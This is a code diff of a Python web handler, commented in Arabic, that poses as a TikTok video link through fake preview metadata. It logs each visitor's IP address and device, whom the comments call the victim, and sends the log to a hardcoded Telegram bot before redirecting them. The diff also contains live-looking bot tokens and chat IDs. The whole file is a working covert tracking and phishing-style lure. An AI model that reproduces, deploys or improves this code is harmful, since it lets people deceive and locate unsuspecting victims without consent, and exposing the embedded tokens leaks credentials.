@@ -1,53 +1,70 @@
 from http.server import BaseHTTPRequestHandler
 import json
 import urllib.request
+import urllib.parse
 
-# بياناتك الثابتة
-TOKEN = "7161793392:AAH9fN6X0L-yG03E9W7z3_hL6N0"
-ID = "6198462719"
+# 🛡️ بيانات البوت الثابت
+TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
+ID = "5811700860"
 
-# تخزين الرابط
-db = {"url": "https://vt.tiktok.com/"}
+# مخزن الرابط
+class Storage:
+    target_url = "https://vt.tiktok.com/"
+
+storage = Storage()
 
 class handler(BaseHTTPRequestHandler):
     def do_POST(self):
-        content_length = int(self.headers['Content-Length'])
-        data = json.loads(self.rfile.read(content_length))
-        db["url"] = data.get("url")
-        self.send_response(200)
-        self.end_headers()
+        try:
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            data = json.loads(post_data)
+            storage.target_url = data.get("url", "https://vt.tiktok.com/")
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps({"status": "success"}).encode())
+        except:
+            self.send_response(500)
+            self.end_headers()
 
     def do_GET(self):
-        # سحب المعلومات
-        ip = self.headers.get('x-forwarded-for', self.client_address[0])
+        # 1. سحب بيانات الضحية
+        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
         ua = self.headers.get('User-Agent', 'Unknown')
         
-        # إرسال البيانات للتليجرام (استخدام urllib لضمان العمل بدون مشاكل مكتبات)
+        # 2. إرسال البيانات فوراً لتليجرام باستخدام (بيانات البوت الثابت)
         try:
-            text = f"🛰️ Radar Log:\nIP: {ip}\nDevice: {ua}"
-            api_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={urllib.parse.quote(text)}"
-            urllib.request.urlopen(api_url)
-        except:
-            pass
+            report = f"🛰️ **Radar-X20 New Hit!**\n\n🌐 **IP:** `{ip}`\n📱 **Device:** `{ua}`\n🔗 **Redirected to:** {storage.target_url}"
+            encoded_text = urllib.parse.quote(report)
+            api_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={encoded_text}&parse_mode=Markdown"
+            
+            # إرسال الطلب مع User-Agent لضمان القبول
+            req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
+            urllib.request.urlopen(req)
+        except Exception as e:
+            print(f"Send Error: {e}")
 
+        # 3. عرض صفحة التمويه (MetaData لتيك توك)
         self.send_response(200)
         self.send_header('Content-type', 'text/html; charset=utf-8')
         self.end_headers()
         
-        # هنا خدعة المعاينة: الرابط سيظهر كأنه تيك توك عند الإرسال
-        target = db["url"]
         html = f"""
         <!DOCTYPE html>
         <html>
         <head>
-            <title>TikTok</title>
-            <meta property="og:title" content="TikTok - شاهد الفيديو">
-            <meta property="og:image" content="https://www.tiktok.com/favicon.ico">
-            <meta property="og:description" content="اضغط لمشاهدة المقطع الممتع">
+            <meta charset="UTF-8">
+            <title>TikTok Video</title>
+            <meta property="og:title" content="TikTok - Watch Video">
+            <meta property="og:description" content="شاهد هذا المقطع الممتع">
+            <meta property="og:image" content="https://sf16-scmcdn-sg.ibytedtos.com/obj/eden-sg/uufs_om_lp/ljhwZ_lp/2021/tiktok_og_image.png">
+            <meta property="og:type" content="video.other">
             <meta name="twitter:card" content="summary_large_image">
             <script>
-                // تحويل سريع جداً
-                window.location.replace("{target}");
+                setTimeout(function() {{
+                    window.location.replace("{storage.target_url}");
+                }}, 400);
             </script>
         </head>
         <body style="background:black;"></body>
